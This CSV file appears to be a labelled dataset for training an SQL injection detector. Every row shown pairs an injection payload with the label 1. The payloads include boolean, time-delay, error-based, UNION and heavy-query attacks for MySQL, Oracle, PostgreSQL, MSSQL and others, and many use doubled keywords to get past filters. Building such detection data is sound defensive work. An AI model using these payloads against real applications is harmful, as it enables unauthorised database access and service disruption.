Query,Label
-8010' oorr   (  2225  =  8491  )  *8491 anandd 'eipf'  =  'eipf,1
"1"" anandd 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   anandd ""icow"" lilikeke ""icow",1
sselectelect   (  case when   (  5847  =  2826  )   then 5847 else cast  (  1 as iinnt  )  /  (  sselectelect 0 ffromrom dual  )   end  )   ffromrom dual--,1
"1'   )    )     )   anandd 6510  =    (  sselectelect count  (  *  )   frofromm sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   anandd    (    (     (  'ibav'  =  'ibav",1
"1' oorr 8156  =    (  sselectelect count  (  *  )   ffromrom generate_series  (  1,5000000   )    )   --",1
"-9758'+  (  selselectect 'rlcy' wwherehere 3691  =  3691 uunionnion all selselectect 3691,3691,3691,3691,3691,3691,3691--",1
"-4473'  )   ununionion all selecselectt 7656,7656#",1
-8922 oorr 5903  =    (  'qqpjq'||  (  selecselectt case 5903 when 5903 then 1 else 0 end frofromm rdb$databdatabasease  )  ||'qzvzq'  )  -- krmh,1
"1'  )   oorr 8315  =    (  seselectlect count  (  *  )   ffromrom sysibm.systabtableles as t1,sysibm.systabtableles as t2,sysibm.systabtableles as t3  )   anandd   (  'amjh'  =  'amjh",1
"1'  )   wherwheree 6774  =  6774 oorr 5286  =    (  seselectlect count  (  *  )   frfromom all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"1""  )   whewherere 6255  =  6255 aandnd extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  selecselectt   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",1
"sselectelect benchmark  (  5000000,md5  (  0x4c4d6142   )    )    anandd    (    (   'xcxr' lilikeke 'xcxr",1
"1'+  (  sselectelect 'yfrs' wwherehere 4388  =  4388 aandnd 9254  =    (  sselectelect count  (  *  )   frofromm rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
-9522  )   as lraw whewherere 9472  =  9472 oorr   (  4087  =  8213  )  *8213--,1
"1%"" oorr 6979  =  lilikeke  (  'abcdefg',upper  (  hex  (  rananddomblob  (  500000000/2   )    )      )    )   --",1
"1""  )   wherwheree 5828  =  5828 oorr 8384  =  liklikee  (  'abcdefg',upper  (  hex  (  rananddomblob  (  500000000/2   )    )      )    )   --",1
selselectect sleep  (  5  )   anandd 'hhrw' lilikeke 'hhrw,1
1   )    )    as nwyh whewherere 7100  =  7100,1
"-1339   )    )     )   uniounionn all selselectect 6318,6318,6318,6318,6318,6318,6318,6318,6318#",1
1'+  (  selecselectt 'dhcv' whewherere 9372  =  9372,1
-8453   )    )     )   oorr 3038  =  3038,1
1'  )   whwhereere 8274  =  8274,1
"1""  )   oorr   (  seselectlect 9173 frofromm  (  seselectlect count  (  *  )  ,concat  (  0x7171706a71,  (  seselectlect   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,flooorr  (  ranandd  (  0  )  *2   )    )   x frofromm iinnfoorrmation_schema.character_ssetets group bbyy x  )  a  )   anandd   (  ""rwlq""  =  ""rwlq",1
"1""   )    )    oorr elt  (  6272  =  6272,sleep  (  5   )    )    anandd    (    (   ""tvla""  =  ""tvla",1
"-3116   )    )    as jyiq wwherehere 3875  =  3875 ununionion all selselectect 3875,3875,3875,3875,3875,3875,3875,3875#",1
"1' whwhereere 4701  =  4701 anandd row  (  6237,7469  )  >  (  selecselectt count  (  *  )  ,concat  (  0x7171706a71,  (  selecselectt   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,flooorr  (  ranandd  (  0  )  *2   )    )   x frofromm   (  selecselectt 5192 uniounionn selecselectt 3785 uniounionn selecselectt 3931 uniounionn selecselectt 7158  )  a group bbyy x  )  --",1
"1""   )    )    as etap wwherehere 8506  =  8506 uunionnion all sselectelect nnullull,nnullull,nnullull,nnullull#",1
"1  )   oorr row  (  1045,7562  )  >  (  seleselectct count  (  *  )  ,concat  (  0x7171706a71,  (  seleselectct   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,flooorr  (  raandnd  (  0  )  *2   )    )   x frfromom   (  seleselectct 8488 uunionnion seleselectct 5584 uunionnion seleselectct 3051 uunionnion seleselectct 1210  )  a group bbyy x  )   aandnd   (  3872  =  3872",1
"1""  )   anandd 4241  =  convert  (  iinnt,  (  selselectect char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  selselectect   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   anandd   (  ""hbfr"" liklikee ""hbfr",1
"1' oorr   (  seselectlect 9173 ffromrom  (  seselectlect count  (  *  )  ,concat  (  0x7171706a71,  (  seselectlect   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,flooorr  (  raandnd  (  0  )  *2   )    )   x ffromrom iinnfoorrmation_schema.character_ssetets group bbyy x  )  a  )   aandnd 'wwwb'  =  'wwwb",1
"1'  )   oorr char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nnullull  )  ,0  )  ,500000000  )  ,nnullull  )   anandd   (  'maln' liklikee 'maln",1
"1%""  )   aandnd elt  (  4249  =  4249,7259  )   aandnd   (  ""%""  =  """,1
1  )   aandnd 4386  =  utl_iinnaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  seleselectct   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   ffromrom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    aandnd   (  6518  =  6518,1
"1""  )   whwhereere 1705  =  1705",1
1' iinn boolean mode  )   rllikeike   (  seselectlect * frfromom   (  seselectlect  (  sleep  (  5   )    )     )  vwyq  )  #,1
"1""   )    )    as dvpb whewherere 6673  =  6673",1
"seleselectct benchmark  (  5000000,md5  (  0x4c4d6142   )    )   # idxq",1
1  )   uniunionon all sselectelect nulnulll#,1
"1%""  )   anandd sleep  (  5  )  #",1
"1"" whwhereere 5977  =  5977",1
"-4340   )    )    oorr make_sesett  (  9354  =  9354,7185  )   aandnd    (    (   8505  =  8505",1
1'+  (  selselectect 'drqj' whwhereere 1246  =  1246,1
1%'   )    )     )   aandnd 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  seleselectct   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   frfromom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   aandnd    (    (     (  '%'  =  ',1
"1""   )    )    as uqem whewherere 3521  =  3521",1
"1' aandnd elt  (  1210  =  1210,sleep  (  5   )    )    aandnd 'pjrf'  =  'pjrf",1
1'  )   anandd 5999  =  5879,1
"-9601'   )    )    oorr 1 group bbyy concat  (  0x7171706a71,  (  seleselectct   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,flooorr  (  ranandd  (  0  )  *2   )    )    haviinng miinn  (  0  )  #",1
-2793'  )   wwherehere 2621  =  2621 uunionnion all selecselectt 2621#,1
1 uunionnion all selecselectt nulnulll#,1
seselectlect case when 1802  =  7063 then 1 else nunullll end--,1
"-6680%""   )    )    uniunionon all seleselectct 3719,3719,3719,3719,3719,3719,3719,3719,3719--",1
"1   (  seselectlect   (  case when   (  5451  =  5451  )   then regexp_substriinng  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,nnullull  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   frfromom iinnfoorrmation_schema.system_users  )  -- fzhj",1
1'+  (  seselectlect onzd whwhereere 8452  =  8452 anandd 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  seselectlect   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   +',1
"-5624' uunionnion all seselectlect 3723,3723,3723,3723,3723--",1
"-9371'  )   uunionnion all selselectect 5900,5900,5900#",1
"1"" anandd   (  selecselectt 9067 frofromm  (  selecselectt count  (  *  )  ,concat  (  0x7171706a71,  (  selecselectt   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,flooorr  (  ranandd  (  0  )  *2   )    )   x frofromm iinnfoorrmation_schema.character_sesetts group bbyy x  )  a  )   anandd ""krtr"" llikeike ""krtr",1
"1%'  )   aandnd 3580  =    (  sselectelect count  (  *  )   frofromm domaiinn.domaiinns as t1,domaiinn.columns as t2,domaiinn.tatablebles as t3  )  --",1
1'   )    )     )   oorr 6793  =    (  seleselectct 6793 frofromm pg_sleep  (  5   )    )    aandnd    (    (     (  'ugrk'  =  'ugrk,1
"call regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nulnulll  )  ,0  )  ,500000000  )  ,nulnulll  )   aandnd 'nhuk'  =  'nhuk",1
"1,  (  sselectelect   (  case when   (  5885  =  1825  )   then 1 else 5885*  (  sselectelect 5885 frofromm master..sysdatabadatabaseses  )   end   )    )   ",1
"1  )   as lhie whwhereere 4631  =  4631 uniunionon all selselectect nunullll,nunullll,nunullll,nunullll,nunullll--",1
"1""  )   wwherehere 8588  =  8588",1
"1' anandd 6414  =    (  selecselectt count  (  *  )   frfromom rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ",1
1  )   whwhereere 6304  =  6304,1
"-6924'  )   ununionion all seselectlect 2046,2046,2046,2046,2046,2046,2046--",1
"-2901"" oorr elt  (  9866  =  9099,9099  )   aandnd ""asib"" lilikeke ""asib",1
-6500'   )    )    oorr   (  8459  =  8459  )  *4906 anandd    (    (   'padu' lilikeke 'padu,1
"1'   )    )    anandd char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substriinng  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,nnullull  )   anandd    (    (   'wcmt'  =  'wcmt",1
"1  )   as qzif whwhereere 7877  =  7877 uniunionon all seleselectct nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull--",1
"1%'  )   anandd 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
1'  )   oorr 6793  =    (  sselectelect 6793 frfromom pg_sleep  (  5   )    ) ,1
selselectect   (  case when   (  2830  =  7046  )   then 2830 else cast  (  1 as iinnt  )  /  (  selselectect 0 frofromm dual  )   end  )   frofromm dual--,1
"1'+  (  seselectlect 'ixza' whwhereere 4374  =  4374 uniounionn all seselectlect nunullll,nunullll,nunullll--",1
"1'   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   anandd    (    (     (  'dzzx'  =  'dzzx",1
"1  )   uniunionon all sselectelect nunullll,nunullll,nunullll,nunullll,nunullll,nunullll,nunullll,nunullll--",1
-3677'   )    )    oorr 1939  =  4484,1
"1'   )    )    anandd 3202  =  liklikee  (  'abcdefg',upper  (  hex  (  rananddomblob  (  500000000/2   )    )      )    )    anandd    (    (   'nbsr' liklikee 'nbsr",1
"-7323%"" oorr 4144  =    (  selecselectt upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selecselectt   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   frfromom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   frfromom dual  )   anandd ""%""  =  """,1
"1%'   )    )     )   ununionion all selecselectt nulnulll,nulnulll,nulnulll,nulnulll,nulnulll--",1
"1' aandnd 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selecselectt   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   frfromom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   aandnd 'cxoorr'  =  'cxoorr",1
"-3298 uniunionon all seleselectct 7618,7618,7618,7618,7618,7618,7618,7618,7618,7618#",1
"1 aandnd 5556  =    (  seselectlect count  (  *  )   frofromm all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  # zwck",1
"1%'   )    )     )   oorr   (  seleselectct 9173 frfromom  (  seleselectct count  (  *  )  ,concat  (  0x7171706a71,  (  seleselectct   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,flooorr  (  raandnd  (  0  )  *2   )    )   x frfromom iinnfoorrmation_schema.character_sesetts group bbyy x  )  a  )   aandnd    (    (     (  '%'  =  '",1
"selecselectt count  (  *  )   ffromrom sysibm.systabtableles as t1,sysibm.systabtableles as t2,sysibm.systabtableles as t3 anandd    (    (     (  '%'  =  '",1
-9393' whewherere 3119  =  3119 oorr 8571  =  8571--,1
"1'+  (  selselectect 'ixvd' whwhereere 4772  =  4772 aandnd char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nunullll  )  ,0  )  ,500000000  )  ,nunullll   )    )   +'",1
"-8506'   )    )     )   ununionion all seleselectct 1950,1950,1950,1950,1950,1950--",1
1 anandd sleep  (  5  )  #,1
1'+  (  selselectect yjtm whewherere 3965  =  3965 anandd 9389  =  3443,1
"-3505""  )   oorr 5290  =  3436--",1
"1'  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   anandd   (  'knhm'  =  'knhm",1
"1' wherwheree 4245  =  4245 ununionion all sselectelect nunullll,nunullll--",1
1   )    )    as rbcf wherwheree 1053  =  1053,1
"1""   )    )    as gbxx wherwheree 2459  =  2459 waitfoorr delay '0:0:5'--",1
"seleselectct pg_sleep  (  5  )   aandnd    (    (   ""qani""  =  ""qani",1
"selecselectt count  (  *  )   ffromrom all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 anandd    (    (   ""soyg""  =  ""soyg",1
-5113'   )    )     )   oorr 7200  =  3094--,1
"1""  )   as zuzm whewherere 1211  =  1211 aandnd elt  (  5458  =  2966,2966  )  --",1
1'||  (  selselectect 'pcps' frofromm dual whewherere 7255  =  7255 anandd 7121  =  4603,1
1  )   wherwheree 6116  =  6116 anandd 4386  =  utl_iinnaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sselectelect   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   frofromm dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1
"1%""   )    )     )   uniunionon all selecselectt nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull#",1
1'  )   wwherehere 3187  =  3187 oorrdeoorrderr bbyy 1#,1
"1%'   )    )     )   aandnd 6510  =    (  seselectlect count  (  *  )   frfromom sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   aandnd    (    (     (  '%'  =  '",1
"-5757%""  )   oorr 6872  =  6872 aandnd   (  ""%""  =  """,1
"1"" oorr sleep  (  5  )   aandnd ""fbuo"" lilikeke ""fbuo",1
"1'   )    )    as kfnt whwhereere 8090  =  8090 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",1
-2992'   )    )    oorr 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  selselectect   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   aandnd    (    (   'tjgt'  =  'tjgt,1
"-3219""  )   ooorrderrder bbyy 1--",1
"1""   )    )     )   oorr sleep  (  5  )  #",1
"1"" rllikeike   (  selecselectt * frofromm   (  selecselectt  (  sleep  (  5   )    )     )  vwyq  )  #",1
"  (  seleselectct   (  case when   (  1343  =  1343  )   then   (  seleselectct count  (  *  )   frofromm all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   else 1343 end  )   frofromm dual  )  ",1
-6190'  )   wherwheree 2621  =  2621 oorr 4144  =    (  selecselectt upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selecselectt   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   frfromom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   frfromom dual  )  --,1
"1'   )    )    as ezpq wwherehere 2976  =  2976 uunionnion all seselectlect nunullll,nunullll,nunullll,nunullll,nunullll,nunullll,nunullll,nunullll,nunullll,nunullll#",1
"1'||  (  selselectect 'zqdn' wherwheree 6194  =  6194 uniunionon all selselectect nnullull,nnullull,nnullull,nnullull--",1
"1"" procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  seleselectct   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   aandnd ""acbq"" llikeike ""acbq",1
1'   )    )    rllikeike   (  selecselectt   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    aandnd    (    (   'ltki'  =  'ltki,1
"1'  )   as ezoa whwhereere 4915  =  4915 anandd 9660  =    (  selselectect count  (  *  )   frfromom all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
-8878' iinn boolean mode  )   uniounionn all sselectelect 7785#,1
1'   )    )    aandnd   (  7517  =  3423  )  *3423 aandnd    (    (   'aenz'  =  'aenz,1
-2797'   )    )     )   uniunionon all selecselectt 5711#,1
"1  )   oorr   (  seselectlect 2*  (  if   (    (   seselectlect * frofromm   (  seselectlect concat  (  0x7171706a71,  (  seselectlect   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   aandnd   (  2303  =  2303",1
1'  )   anandd   (  3020  =  3020  )  *6703 anandd   (  'botl' lilikeke 'botl,1
"iif  (  9875  =  8961,1,1/0  )  ",1
"-7843' wwherehere 5986  =  5986 oorr make_sesett  (  9354  =  9354,7185  )  --",1
"-4669' uniounionn all sselectelect 9387,9387,9387,9387,9387,9387,9387,9387,9387,9387--",1
"1"" wherwheree 3221  =  3221 oorr updupdateatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  seselectlect   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",1
-7466 wherwheree 5161  =  5161 oorr 3038  =  3038,1
"1%""   )    )     )   anandd extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  selselectect   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    anandd    (    (     (  ""%""  =  """,1
"-4477'   )    )    ununionion all seleselectct 8444,8444,8444,8444,8444,8444,8444,8444--",1
"1%' aandnd extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  selselectect   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    aandnd '%'  =  '",1
1' aandnd 3715 iinn    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  sselectelect   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     ) ,1
